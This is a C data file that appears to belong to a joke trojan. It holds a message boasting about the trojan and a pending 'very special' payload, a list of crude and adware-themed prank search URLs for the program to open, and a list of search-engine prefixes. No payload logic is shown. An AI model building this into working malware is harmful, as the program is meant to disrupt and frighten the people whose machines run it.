#include "data.h"

const unsigned char msg[] = "Thanks Joel for showing my trojan on stream!\r\n\r\nPlease wait some time until the last payload activates, which is a very special one.";

char *sites[] = {
	"http://google.co.ck/search?q=pussy+destroyer",
	"%1cortana+is+the+new+bonzi",
	"%1animated+christmas+tree+for+desktop",
	"%1mp3+midi+converter",
	"%1smileystoolbar+download",
	"%1how+to+get+cursormania+in+2016",
	"%1preventon+antivirus+download",
	"%1limp+bizkit+mp3+download",
	"%1is+bonzi+buddy+a+virus",
	"%1bad+ass+mafia+toolbar",
	"%1cat+desktop",
	"%1myfelix+download",
	"%1cool+toolbars",
	"http://www.youtube.com/results?search_query=tootorals",
	"http://google.co.ck/search?q=succ",
	"%1grand+dad+rom+download",
	"%1bonzi+buddy+download+free",
	"%1free+midi+download",
	"http://google.co.ck/search?q=fuck+bees",
	"http://google.co.ck/search?q=expand+dong",
	"%1smash+mouth+all+star+midi",
	"%1stanky+danky+maymays",
	"%1john+cena+midi+legit+not+converted",
	"%1skrillex+scay+onster+an+nice+sprites+midi",
	"%1snow+halation+midi",
	"http://pcoptimizerpro.com",
};

char *engines[] = {
	"http://google.co.ck/search?q=",
	"http://ask.com/web?q=",
	"http://search.wow.com/search?q=",
	"http://search.yahoo.com/search;?p=",
	"http://www.bing.com/search?q=",
	"http://www.baidu.com/s?ie=utf-8&wd=",
};

const size_t nSites = sizeof(sites) / sizeof(void *);
const size_t nEngines = sizeof(engines) / sizeof(void *);

const size_t msg_len = sizeof(msg);